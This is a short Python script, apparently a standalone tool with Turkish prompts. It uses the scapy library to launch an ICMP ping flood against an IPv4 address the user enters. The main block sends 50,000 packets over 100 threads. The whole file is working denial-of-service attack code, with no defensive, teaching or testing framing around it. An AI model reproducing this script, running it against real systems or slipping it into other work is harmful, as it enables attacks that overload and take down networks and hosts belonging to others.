from scapy.all import IP, ICMP, send
from threading import Thread
import ipaddress

def is_valid_ipv4(ip_str):
    try:
        ipaddress.IPv4Address(ip_str)
        return True
    except ValueError:
        return False

def flood_worker(pkt, count):
    for _ in range(count):
        send(pkt, verbose=0)

def flood_ping(ip_str, count=1000, threads=10):
    if not is_valid_ipv4(ip_str):
        print("🚫 Lütfen geçerli bir IPv4 adresi girin.")
        return

    print(f"[!] {ip_str} adresine ICMP flood başlatılıyor...")

    pkt = IP(dst=ip_str) / ICMP()

    packets_per_thread = count // threads
    threads_list = []

    for _ in range(threads):
        t = Thread(target=flood_worker, args=(pkt, packets_per_thread))
        t.daemon = True
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    print(f"\n[✓] {count} paket gönderildi.")

if __name__ == "__main__":
    hedef_ip = input("Flood yapılacak hedef IPv4 adresi: ").strip()
    flood_ping(hedef_ip, count=50000, threads=100)
